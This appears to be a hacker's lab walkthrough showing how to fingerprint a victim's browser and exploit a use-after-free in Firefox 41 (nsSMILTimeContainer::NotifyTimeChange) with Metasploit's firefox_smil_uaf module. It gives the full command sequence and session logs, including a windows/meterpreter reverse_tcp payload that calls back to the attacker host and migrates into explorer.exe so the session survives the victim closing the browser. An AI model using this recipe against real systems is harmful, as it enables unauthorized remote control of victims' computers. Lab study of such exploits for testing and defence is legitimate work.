- We are using benefit of vulnerable component "nsSMILTimeContainer::NotifyTimeChange()", which is a specific function or method within the code of Mozilla Firefox. This function is responsible for handling changes in timing related to SMIL.
- SMIL(Synchronized Multimedia integration Language) is a markup language used to describe multimedia presentations, including animations, in web pages.
- The vulnerability is called [[Use-after-free]]
**Note - Before we begine download 41.0 version of Mozilla Firefox.

## Gathering browser information
```python
┌──(hyok㉿kali)-[~]
└─$ msfconsole -q                  
msf6 > use auxiliary/gather/browser_info
msf6 auxiliary(gather/browser_info) > set SRVHOST 192.168.216.5
SRVHOST => 192.168.216.5
msf6 auxiliary(gather/browser_info) > set SRVPORT 80
SRVPORT => 80
msf6 auxiliary(gather/browser_info) > set URIPATH /
URIPATH => /
msf6 auxiliary(gather/browser_info) > run
msf6 auxiliary(gather/browser_info) > run
[*] Auxiliary module running as background job 1.
msf6 auxiliary(gather/browser_info) > 
[-] Target 192.168.1.3 has requested an unknown path: /favicon.ico
[+] 192.168.1.3 - We have found the following interesting information:
[*] 192.168.1.3 - source = Browser allows JavaScript
[*] 192.168.1.3 - ua_name = Firefox
[*] 192.168.1.3 - ua_ver = 41.0
[*] 192.168.1.3 - arch = x86
[*] 192.168.1.3 - os_name = Windows 10
[*] 192.168.1.3 - language = en-US,en;q=0.5
[-] Target 192.168.1.3 has requested an unknown path: /favicon.ico
```
- From above, we see that victim is running firefox version 41.0.
- From version of firefox, we clearly say that we can use an exploit on firefox `nsSMILTimeContainer::NotifyTimeChange()` with the RCE exploit module.

## Exploiting a windows 10
```python
msf6 > use exploit/windows/browser/firefox_smil_uaf
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/browser/firefox_smil_uaf) > set SRVHOST 192.168.1.6
SRVHOST => 192.168.1.6
msf6 exploit(windows/browser/firefox_smil_uaf) > set SRVPORT 80
SRVPORT => 80
msf6 exploit(windows/browser/firefox_smil_uaf) > set URIPATH /
URIPATH => /
msf6 exploit(windows/browser/firefox_smil_uaf) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(windows/browser/firefox_smil_uaf) > set LHOST 192.168.1.6
LHOST => 192.168.1.6
msf6 exploit(windows/browser/firefox_smil_uaf) > exploit
msf6 exploit(windows/browser/firefox_smil_uaf) > [*] Using URL: http://192.168.1.6/
[*] Server started.
[*] 192.168.1.3      firefox_smil_uaf - Gathering target information for 192.168.1.3
[*] 192.168.1.3      firefox_smil_uaf - Sending HTML response to 192.168.1.3
[*] 192.168.1.3      firefox_smil_uaf - Got request: /UzchwB/
[*] 192.168.1.3      firefox_smil_uaf - From: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
[*] 192.168.1.3      firefox_smil_uaf - Sending exploit HTML ...
[*] 192.168.1.3      firefox_smil_uaf - Got request: /UzchwB/worker.js
[*] 192.168.1.3      firefox_smil_uaf - From: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
[*] 192.168.1.3      firefox_smil_uaf - Sending worker thread Javascript ...
[*] Sending stage (175686 bytes) to 192.168.1.3
[*] Session ID 1 (192.168.1.6:4444 -> 192.168.1.3:55785) processing InitialAutoRunScript 'post/windows/manage/priv_migrate'
[*] Current session process is firefox.exe (5336) as: DESKTOP-MKSKBCC\Madfo
[*] Session has User level rights.
[*] Will attempt to migrate to a User level process.
[*] Trying explorer.exe (3484)
[+] Successfully migrated to Explorer.EXE (3484) as: DESKTOP-MKSKBCC\Madfo
[*] Meterpreter session 1 opened (192.168.1.6:4444 -> 192.168.1.3:55785) at 2023-04-12 16:07:01 +0530

msf6 exploit(windows/browser/firefox_smil_uaf) > sessions

Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  1         meterpreter x64/windows  DESKTOP-MKSKBCC\Madfo @ DESKTOP-MKSKBCC  192.168.1.6:4444 -> 192.168.1.3:55785 (192.168.1.3)

msf6 exploit(windows/browser/firefox_smil_uaf) > sessions 1
[*] Starting interaction with 1...

meterpreter > 
```
- This module is specifically designed to exploit a use-after-free vulnerability in Mozilla Firefox on Windows operating systems.
- it targets the `nsSMILTimeContainer::NotifyTimeChange()` function.
- This module attempts to trigger a situation where Firefox continues to use a freed memory address, allowing an attacker to gain control of the vulnerable system or execute arbitrary code within the context of the Firefox process.

**Note
1. When the victim accesses the URL(http://192.168.1.6), we should successfully exploit the use-afterfree vulnerability and get a new session running in the context of the user that accesses the URL.
2. Always make sure your system is connected to internet(In virualbox Network > briged).
3. Note that, to prevent us from losing the session if the user closes the browser, this module uses the post/windows/manage/priv_migrate post-exploitation module to migrate to the explorer.exe process.